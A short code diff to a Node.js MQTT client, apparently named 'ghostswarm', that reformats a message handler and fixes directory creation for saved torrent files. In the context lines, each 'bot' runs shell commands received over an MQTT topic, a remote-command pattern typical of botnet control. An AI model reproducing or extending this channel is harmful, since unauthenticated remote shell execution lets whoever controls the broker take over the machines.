@@ -29,7 +29,9 @@ mqttClient.on('message', (topic, message) => {
          console.log(`📥 [${botId}] received:`, payload);
          executeShellCommand(payload, mqttClient);
 
-      } else if (topic.startsWith('ghostswarm/download/')) {
+      }
+
+      else if (topic.startsWith('ghostswarm/download/')) {
          const infoHash = topic.split('/')[2];
          const payload = JSON.parse(message.toString());
          console.log(`📥 [${botId}] received torrent download request for ${infoHash}`, payload);
@@ -71,6 +73,8 @@ mqttClient.on('message', (topic, message) => {
                }));
             });
       }
+
+
    } catch (err) {
       console.error(`❌ [${botId}] failed to handle message`, err);
 
@@ -119,7 +123,7 @@ function handleTorrentDownload(infoHash, payload) {
       return;
    }
 
-   fs.mkdirSync('torrents', { recursive: true }); // ensure directory exists
+   fs.mkdirSync(path.dirname(torrentPath), { recursive: true }); // ensure directory exists
    fs.writeFileSync(torrentPath, JSON.stringify(payload, null, 2));
    console.log(`📂 [${botId}] saved torrent to ${torrentPath}`);
 
